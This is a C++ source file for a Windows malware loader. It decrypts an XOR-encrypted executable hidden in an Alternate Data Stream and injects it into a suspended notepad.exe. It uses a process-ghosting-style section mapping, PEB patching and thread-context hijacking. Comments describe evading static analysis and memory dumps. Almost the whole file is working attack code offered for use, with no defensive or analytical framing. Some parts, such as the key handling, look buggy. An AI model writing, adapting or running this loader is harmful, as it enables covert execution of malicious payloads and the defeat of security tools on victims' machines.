#define NOMINMAX
#include <windows.h>
#include <vector>
#include <string>
#include <sstream>
#include <iostream>
#include <emmintrin.h>  // For SSE intrinsics
#include <intrin.h>
#include <cstring>

using namespace std;

// Definition of NtMapViewOfSection function pointer (undocumented NT API)
typedef NTSTATUS(NTAPI* pfnNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

// Retrieve the PE entry point offset from a PE image in memory
DWORD GetEntryPoint(LPVOID pPayload) {
    if (!pPayload) return 0;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pPayload;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)pPayload + dos->e_lfanew);
    return nt->OptionalHeader.AddressOfEntryPoint;
}

// Retrieve the total size of the PE image from a PE image in memory
DWORD GetPayloadSize(LPVOID pPayload) {
    if (!pPayload) return 0;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pPayload;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)pPayload + dos->e_lfanew);
    return nt->OptionalHeader.SizeOfImage;
}

// Simple XOR decrypt function: decrypts a buffer using a repeating XOR key
void decryptXOR(vector<BYTE>& data, const char* key, int keyLength) {
    for (size_t i = 0; i < data.size(); i++) {
        data[i] ^= key[i % keyLength];
    }
}

// Get the full path of the current executable
std::string getCurrentExecutablePath() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

// Display the last Windows error in a human-readable format with an action description
void showLastError(const char* action) {
    DWORD errorCode = GetLastError();
    char* errorMessage = NULL;

    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&errorMessage,
        0,
        NULL
    );

    cout << action << "\nError Code: " << errorCode << "\nMessage: " << (errorMessage ? errorMessage : "Unknown") << endl;

    if (errorMessage) {
        LocalFree(errorMessage);
    }
}

// Convert a byte buffer to a hex string (for debugging / display)
std::string hexDump(const vector<BYTE>& buffer, size_t count) {
    std::stringstream ss;
    count = min(count, buffer.size());

    for (size_t i = 0; i < count; i++) {
        char hex[4];
        sprintf_s(hex, "%02X ", buffer[i]);
        ss << hex;
    }

    return ss.str();
}

// XOR encryption/decryption helper for std::string (reversible)
std::string XorEncryptDecrypt(const std::string& input, const std::string& key) {
    std::string output = input;
    for (size_t i = 0; i < input.length(); ++i) {
        output[i] = input[i] ^ key[i % key.length()];
    }
    return output;
}

// Dump the contents of all 16 XMM registers from a CONTEXT structure (debugging)
void dumpXMMRegisters(const CONTEXT& ctx) {
    for (int i = 0; i < 16; i++) {
        const M128A& xmm = *(&ctx.Xmm0 + i);
        cout << "xmm" << i << ": "
            << hex << xmm.Low << " " << xmm.High << endl;
    }
}

// Create a ghost section in the target process by creating a temporary file with SEC_IMAGE
// This maps the decrypted payload image into the target process memory via section mapping
BOOL CreateGhostSection(IN LPVOID pPePayload, IN DWORD pePayloadSize, IN HANDLE hTargetProcess, OUT VOID** ppPePayloadInTargetBaseAddress) {
    BOOL isSuccess = FALSE;
    HANDLE hTempFile = INVALID_HANDLE_VALUE;
    DWORD bytesWritten = 0;
    HANDLE hFileMapping = NULL;
    WCHAR tempFile[MAX_PATH] = L"";
    WCHAR tempDir[MAX_PATH] = L"";

    // Get the temporary folder path
    if (GetTempPathW(MAX_PATH, tempDir) == 0) return FALSE;
    // Create a temporary file name in temp folder
    if (GetTempFileNameW(tempDir, L"tmp", 0, tempFile) == 0) return FALSE;

    // Open the temp file with special flags (temporary and delete on close)
    hTempFile = CreateFileW(
        tempFile,
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );
    if (hTempFile == INVALID_HANDLE_VALUE) return FALSE;

    // Mark the file for automatic deletion
    FILE_DISPOSITION_INFO fileDispositionInfo = { TRUE };
    if (!SetFileInformationByHandle(hTempFile, FileDispositionInfo, &fileDispositionInfo, sizeof(fileDispositionInfo))) return FALSE;

    // Write the decrypted payload to the temporary file
    if (!WriteFile(hTempFile, pPePayload, pePayloadSize, &bytesWritten, NULL) || bytesWritten != pePayloadSize) return FALSE;
    if (!FlushFileBuffers(hTempFile)) return FALSE;

    // Create a file mapping object for the temporary file with SEC_IMAGE flag (maps as an executable image)
    hFileMapping = CreateFileMappingW(
        hTempFile,
        NULL,
        PAGE_READONLY | SEC_IMAGE,
        0,
        0,
        NULL
    );
    if (hFileMapping == NULL) return FALSE;

    // Close the temp file handle since mapping is created
    CloseHandle(hTempFile);
    hTempFile = INVALID_HANDLE_VALUE;

    // Obtain the NtMapViewOfSection function from ntdll.dll (undocumented API)
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    pfnNtMapViewOfSection NtMapViewOfSection = (pfnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    if (!NtMapViewOfSection) return FALSE;

    PVOID baseAddress = nullptr;
    SIZE_T viewSize = 0; // Map the entire section

    // Map the section into the target process's address space
    NTSTATUS status = NtMapViewOfSection(
        hFileMapping,
        hTargetProcess,
        &baseAddress,
        0,                // ZeroBits
        0,                // CommitSize
        NULL,             // SectionOffset
        &viewSize,
        2,                // ViewShare - shared view
        0,                // AllocationType
        PAGE_READONLY     // Protection - read-only
    );

    if (status != 0) return FALSE;

    *ppPePayloadInTargetBaseAddress = baseAddress;

    isSuccess = TRUE;
    return isSuccess;
}

int main() {
    // XOR key hardcoded to avoid detection by static analysis
    string keyXOR = "SECRET";

    // 1. Encrypted string hardcoded with XOR encryption
    string encryptedString = "\x3E\x3C\x28\x37\x3C";

    // 2. Decrypt the string when needed
    std::string keyStr = XorEncryptDecrypt(encryptedString, keyXOR);
    const char* key = keyStr.c_str();

    // 3. Store the key into an SSE register (xmm register) instead of normal RAM to evade memory dumping
    alignas(16) char keyBuffer[16] = { 0 };
    memcpy(keyBuffer, key, std::min(strlen(key), sizeof(keyBuffer)));
    __m128i xmm_key = _mm_load_si128(reinterpret_cast<const __m128i*>(key));

    // Optional: Dump all xmm registers (for debug/demo)
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_ALL;
    GetThreadContext(GetCurrentThread(), &ctx);
    dumpXMMRegisters(ctx);

    int keyLength = strlen(key);
    cout << "Key: " << key << " (length: " << keyLength << ")\n";

    // 4. Immediately zero the key from regular memory to reduce footprint
    LPVOID keyPtr = (LPVOID)key;
    SecureZeroMemory(keyPtr, keyLength);

    // Get current executable path (stub path)
    std::string stubPath = getCurrentExecutablePath();

    // Construct Alternate Data Stream (ADS) path with ":encrypted" stream name
    std::string adsPath = stubPath + ":encrypted";

    // Open the encrypted file stored inside ADS
    HANDLE encryptedFile = CreateFileA(
        adsPath.c_str(),
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (encryptedFile == INVALID_HANDLE_VALUE) {
        showLastError("Failed to open Alternate Data Stream");
        return 1;
    }

    DWORD fileSize = GetFileSize(encryptedFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        showLastError("Failed to get file size");
        CloseHandle(encryptedFile);
        return 1;
    }

    cout << "ADS Size: " << fileSize << " bytes\n";

    vector<BYTE> encryptedBuffer(fileSize);
    DWORD bytesRead;

    if (!ReadFile(encryptedFile, encryptedBuffer.data(), fileSize, &bytesRead, NULL)) {
        showLastError("Failed to read ADS content");
        CloseHandle(encryptedFile);
        return 1;
    }
    CloseHandle(encryptedFile);

    if (bytesRead == 0 || bytesRead != fileSize) {
        cout << "Error reading ADS or incomplete data" << endl;
        return 1;
    }

    // 5. Recover the key from xmm register (simulate reading from CPU register)
    char recoveredKeyBytes[16];
    memcpy(recoveredKeyBytes, &xmm_key, sizeof(xmm_key));
    cout << "Recovered Key: ";
    for (int i = 0; i < 16; i++) {
        if (isprint((unsigned char)recoveredKeyBytes[i])) {
            cout << recoveredKeyBytes[i];
        }
        else {
            cout << ".";
        }
    }
    cout << endl;

    // Decrypt the encrypted buffer with the recovered key
    decryptXOR(encryptedBuffer, recoveredKeyBytes, keyLength);

    cout << "Bytes after decryption: " << hexDump(encryptedBuffer, 16) << "\n";

    // Basic check for valid PE file signature "MZ"
    if (encryptedBuffer.size() < 2 || encryptedBuffer[0] != 0x4D || encryptedBuffer[1] != 0x5A) {
        cout << "Decrypted file does not appear to be a valid executable (no MZ header)\n";
        return 1;
    }

    // Create a temporary file path to dump decrypted executable (for debugging)
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char tempFileName[MAX_PATH];
    sprintf_s(tempFileName, "%sdecrypted_%d.exe", tempPath, GetTickCount());

    HANDLE tempFileHandle = CreateFileA(tempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD bytesWritten;
    if (!WriteFile(tempFileHandle, encryptedBuffer.data(), encryptedBuffer.size(), &bytesWritten, NULL)) {
        showLastError("Failed to write to temporary file");
        CloseHandle(tempFileHandle);
        DeleteFileA(tempFileName);
        return 1;
    }

    CloseHandle(tempFileHandle);

    if (bytesWritten != encryptedBuffer.size()) {
        cout << "Not all bytes were written to the temporary file" << endl;
        DeleteFileA(tempFileName);
        return 1;
    }

    cout << "Temporary file created: " << tempFileName << "\n";
    cout << "Size: " << bytesWritten << " bytes\n";

    // Create a suspended dummy process to inject the decrypted payload (example: notepad.exe)
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        showLastError("CreateProcessA failed");
        return 1;
    }

    void* remoteBase = nullptr;

    // Use CreateGhostSection to map the decrypted PE payload into the target suspended process
    BOOL result = CreateGhostSection(
        encryptedBuffer.data(),
        (DWORD)encryptedBuffer.size(),
        pi.hProcess,
        &remoteBase
    );

    if (!result) {
        cout << "CreateGhostSection failed\n";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    std::cout << "Section mapped in remote process at: " << remoteBase << "\n";

    // Get the thread context of the main thread in the suspended process
    CONTEXT context = { 0 };
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &context)) {
        std::cerr << "Error getting thread context\n";
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

#ifdef _M_X64
    // On x64, PEB base address is stored in Rdx register in thread context
    PVOID pebAddress = (PVOID)context.Rdx;
#else
    // On x86, PEB base address is stored in Ebx register in thread context
    PVOID pebAddress = (PVOID)context.Ebx;
#endif

    SIZE_T* bytesWrittenn = 0;
    // Write the mapped section base address into ImageBaseAddress field of PEB (offset 0x10)
    if (!WriteProcessMemory(pi.hProcess, (BYTE*)pebAddress + 0x10, &remoteBase, sizeof(remoteBase), bytesWrittenn)) {
        std::cerr << "Error writing ImageBaseAddress to PEB\n";
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Calculate the Entry Point address based on the mapped section base and PE entry offset
    DWORD entryOffset = GetEntryPoint(encryptedBuffer.data());

    // Set the instruction pointer (EIP/RIP) of the suspended thread to the payload entry point
#ifdef _M_X64
    context.Rip = (DWORD64)((BYTE*)remoteBase + entryOffset);
#else
    context.Eip = (DWORD)((BYTE*)remoteBase + entryOffset);
#endif

    if (!SetThreadContext(pi.hThread, &context)) {
        std::cerr << "Error setting thread context\n";
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Resume the suspended thread, starting execution from the payload entry point
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
